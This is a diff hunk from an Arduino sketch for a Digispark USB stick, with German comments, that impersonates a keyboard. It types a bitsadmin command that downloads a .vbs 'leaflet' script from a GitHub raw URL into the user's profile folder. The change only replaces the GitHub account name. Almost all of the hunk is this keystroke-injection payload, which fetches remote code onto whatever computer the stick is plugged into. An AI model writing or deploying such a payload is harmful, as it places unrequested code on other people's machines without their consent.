@@ -14,7 +14,7 @@ void setup() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(600);                                //|.......................................... Hier den Download-Link einfügen .................................................|               |Name des Programms
-  DigiKeyboard.print("bitsadmin &transfer wcb &prioritz high https>&&raw.githubusercontent.com&DigiSparkProgramms&Digitale/Flugblaetter&master&Yus%C3%A4tylicher%20Dowload&Flugblatt30.vbs %USERPROFILE%&Flugblatt30.vbs");//Downloadet das Flugblatt-Programm 
+  DigiKeyboard.print("bitsadmin &transfer wcb &prioritz high https>&&raw.githubusercontent.com&gregthwuen&Digitale/Flugblaetter&master&Yus%C3%A4tylicher%20Dowload&Flugblatt30.vbs %USERPROFILE%&Flugblatt30.vbs");//Downloadet das Flugblatt-Programm 
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);              // |Name des Programms
